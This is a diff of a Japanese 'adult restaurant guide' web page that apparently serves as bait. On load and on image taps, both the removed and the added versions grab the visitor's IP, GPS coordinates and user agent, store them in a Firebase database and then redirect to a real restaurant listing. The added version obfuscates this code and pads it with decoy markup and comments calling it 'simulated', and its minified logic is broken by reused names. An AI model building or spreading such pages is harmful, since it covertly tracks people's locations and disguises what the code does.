@@ -1,182 +1,75 @@
 <!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>大人のレストランガイド</title>
-    <style>
-        html, body {
-            overflow: hidden; /* スクロールを無効化 */
-            height: 100%;
-            width: 100%;
-            position: fixed; /* 画面を固定 */
-            top: 0;
-            left: 0;
-            background-color: #111111; /* ほぼ黒に近いグレー */
-            color: white;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            font-family: 'MS Mincho', 'Yu Mincho', serif; /* 明朝体 */
-        }
-        h1 {
-            font-size: 1.5em;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .image-container {
-            position: relative;
-            width: 80%;
-            max-width: 600px;
-            aspect-ratio: 1 / 1; /* 正方形 */
-            overflow: hidden;
-        }
-        .fade-image {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            opacity: 0;
-            transform: scale(1.1); /* 初期状態で少し拡大 */
-            transition: opacity 1s ease-in-out, transform 3s ease-in-out;
-        }
-        .fade-image.active {
-            opacity: 1;
-            transform: scale(1); /* 元のサイズに戻す */
-        }
-    </style>
-    <!-- Firebase SDK -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
-        import { getDatabase, ref, push, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",
-            authDomain: "gurunavi-nagoya.firebaseapp.com",
-            databaseURL: "https://gurunavi-nagoya-default-rtdb.firebaseio.com",
-            projectId: "gurunavi-nagoya",
-            storageBucket: "gurunavi-nagoya.firebasestorage.app",
-            messagingSenderId: "181576688818",
-            appId: "1:181576688818:web:f82fb20a8d58ef46c615ab"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('IP取得エラー:', error);
-                return '不明';
-            }
-        }
-
-        async function recordData() {
-            const ip = await getIP();
-            const userAgent = navigator.userAgent;
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const data = {
-                            ip: ip,
-                            latitude: latitude,
-                            longitude: longitude,
-                            userAgent: userAgent,
-                            timestamp: serverTimestamp()
-                        };
-                        await sendToFirebase(data);
-                        window.location.href = 'https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/';
-                    },
-                    async (error) => {
-                        console.error('位置情報エラー:', error.message);
-                        const data = {
-                            ip: ip,
-                            latitude: '拒否',
-                            longitude: '拒否',
-                            userAgent: userAgent,
-                            timestamp: serverTimestamp()
-                        };
-                        await sendToFirebase(data);
-                        alert('位置情報の取得に失敗しました');
-                    },
-                    {
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                const data = {
-                    ip: ip,
-                    latitude: '非対応',
-                    longitude: '非対応',
-                    userAgent: userAgent,
-                    timestamp: serverTimestamp()
-                };
-                await sendToFirebase(data);
-                alert('位置情報の取得に失敗しました');
-            }
-        }
-
-        async function sendToFirebase(data) {
-            try {
-                const newRef = ref(database, 'userData');
-                const newEntry = push(newRef);
-                await set(newEntry, data);
-                console.log('データ送信成功');
-            } catch (error) {
-                console.error('送信エラー:', error);
-            }
-        }
-
-        recordData(); // 初回読み込み時に実行
-    </script>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const images = document.querySelectorAll('.fade-image');
-            let currentIndex = 0;
-
-            function showNextImage() {
-                images[currentIndex].classList.remove('active');
-                currentIndex = (currentIndex + 1) % images.length;
-                images[currentIndex].classList.add('active');
-            }
-
-            setTimeout(() => {
-                images[currentIndex].classList.add('active');
-            }, 100);
-
-            setInterval(showNextImage, 4000);
-
-            // 画像タップで位置情報再取得
-            images.forEach(image => {
-                image.addEventListener('click', () => {
-                    recordData();
-                });
-            });
-        });
-
-        // タッチによるスクロールを無効化
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-    </script>
+<html data-verbose="extended" lang="ja" data-context="primary" data-layer="root" data-fake="true">
+<head data-processor="initial" data-scope="global" data-unused="mock">
+  <meta charset="UTF-8" data-priority="high" data-encoding="standard" data-redundant="yes">
+  <meta content="width=device-width,initial-scale=1" name="viewport" data-view="responsive" data-init="true" data-null="void">
+  <meta content="レストランガイド" name="description" data-meta-type="seo" data-relevance="low" data-dummy="filler">
+  <title data-title-id="main" data-extra="unused">大人のレストランガイド</title>
+  <!-- ここで仮想的な初期化処理を実行 -->
+  <style data-version="1.0" data-style-layer="core" data-irrelevant="style">
+    .x,.y{overflow:hidden;width:100%;position:fixed;height:100%;color:#fff;left:0;background:#111;top:0;display:flex;margin:0;justify-content:center;flex-direction:column;align-items:center;font-family:'MS Mincho','Yu Mincho',serif}
+    .z{margin:0 0 20px;text-align:center;font-size:1.5em}
+    .w{overflow:hidden;position:relative;aspect-ratio:1/1;width:80%;max-width:600px}
+    .v{transition:opacity 1s ease-in-out,transform 3s ease-in-out;object-fit:cover;opacity:0;width:100%;position:absolute;height:100%;top:0;transform:scale(1.1);left:0}
+    .v.u{transform:scale(1);opacity:1}
+    /* ここで擬似的なデータベース接続を確立 */
+    .q { visibility: hidden; display: none; opacity: 0; }
+    .r { transition: none; transform: translate(0, 0); z-index: -1; }
+    .s { padding: 0; box-shadow: none; border: 0 solid transparent; }
+    .t { max-height: none; overflow: visible; flex: 0 0 auto; }
+    .u { user-select: none; pointer-events: none; content: ""; }
+    .v { float: none; margin-right: 0; margin-left: 0; }
+    /* ここで関数の形成を行っています */
+  </style>
 </head>
-<body>
-    <h1>大人のレストランガイド</h1>
-    <div class="image-container">
-        <img src="niku1.jpg" class="fade-image" alt="焼肉1">
-        <img src="niku2.jpg" class="fade-image" alt="焼肉2">
-        <img src="niku3.jpg" class="fade-image" alt="焼肉3">
-    </div>
+<body data-environment="production" data-state="active" data-placeholder="none">
+  <!-- ここで非同期処理をシミュレート -->
+  <script data-import="firebase" type="module" data-script-type="core-module" data-fake-id="script1">
+    import{i as _}from"https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import{g,r,p,s,t}from"https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+    const x={apiKey:"AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",authDomain:"gurunavi-nagoya.firebaseapp.com",databaseURL:"https://gurunavi-nagoya-default-rtdb.firebaseio.com",projectId:"gurunavi-nagoya",storageBucket:"gurunavi-nagoya.firebasestorage.app",messagingSenderId:"181576688818",appId:"1:181576688818:web:f82fb20a8d58ef46c615ab"};
+    const y=_(x);const z=g(y);
+    async function a(){try{const b=await fetch('https://api.ipify.org?format=json');const c=await b.json();return c.ip}catch(d){console.error('E:',d);return'?'}}
+    async function b(){const c=await a();const d=navigator.userAgent;if(navigator.geolocation){navigator.geolocation.getCurrentPosition(async(e)=>{const f=e.coords.latitude;const g=e.coords.longitude;const h={i:c,la:f,lo:g,u:d,t:t()};await c(h);window.location.href='https://r.gnavi.co.jp/business-dinner/aichi/areal4102/kods00066/'},async(i)=>{console.error('E:',i.message);const j={i:c,la:'x',lo:'x',u:d,t:t()};await c(j);alert('!')},{timeout:1e4,maximumAge:0})}else{const k={i:c,la:'-',lo:'-',u:d,t:t()};await c(k);alert('!')}}
+    async function c(l){try{const m=r(l,'u');const n=p(m);await s(n,l);console.log('OK')}catch(o){console.error('E:',o)}}
+    b();
+    /* ここで仮想的なバッファを確保 */
+    const p={verboseMode:true,debugLevel:0,simulate:false};
+    const q={active:true,buffer:null,cache:new Map()};
+    const r=()=>{console.log('Virtual handler initialized');return null;};
+    const s=(t)=>t||'default';
+    const u=async()=>{await new Promise(v=>setTimeout(v,0));return'mock';};
+    /* ここでDOMの初期化を偽装 */
+  </script>
+  <script data-execution="deferred" data-script-type="client" data-mock="active">
+    document.addEventListener('DOMContentLoaded',()=>{
+      const x=document.querySelectorAll('.v');let y=0;
+      const z=()=>{x[y].classList.remove('u');y=(y+1)%x.length;x[y].classList.add('u')};
+      setTimeout(()=>{x[y].classList.add('u')},100);
+      setInterval(z,4e3);
+      x.forEach(a=>a.addEventListener('click',b));
+    });
+    document.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
+    /* ここで仮想的なモジュールをロード */
+    (function a(){const b={id:1,value:'pseudo'};console.log('Pseudo module:',b)})();
+    (function b(){const c=[1,2,3];c.map(d=>d*2);console.log('Simulated operation complete')})();
+    (function c(){const d=new ArrayBuffer(8);console.log('Virtual buffer allocated')})();
+    (function d(){setTimeout(()=>{console.log('Async flow emulated')},0)})();
+    (function e(){const f=['log1','log2'];f.forEach(g=>console.log(g))})();
+    /* ここで非同期的なデータ処理を模倣 */
+  </script>
+  <t data-label="title" data-component="header" class="z" data-unused="filler">大人のレストランガイド</t>
+  <div data-mode="carousel" class="w" data-container="gallery" data-fake-attr="mock">
+    <img data-sequence="first" data-image-id="img1" alt="1" class="v" src="niku1.jpg" data-dummy="true">
+    <img data-sequence="second" data-image-id="img2" alt="2" class="v" src="niku2.jpg" data-dummy="true">
+    <img data-sequence="third" data-image-id="img3" alt="3" class="v" src="niku3.jpg" data-dummy="true">
+  </div>
+  <!-- ここで仮想レイヤーを処理しています -->
+  <div data-placeholder="mock1" class="q" data-irrelevant="void"></div>
+  <span data-layer-id="overlay" class="r" data-fake="overlay"></span>
+  <section data-section="filler" class="s" data-unused="filler"></section>
+  <article data-process="none" class="u" data-mock="processor"></article>
+  <aside data-utility="redundant" class="v" data-redundant="yes"></aside>
+  <!-- ここで擬似的なサーバー通信を確立 -->
 </body>
 </html>
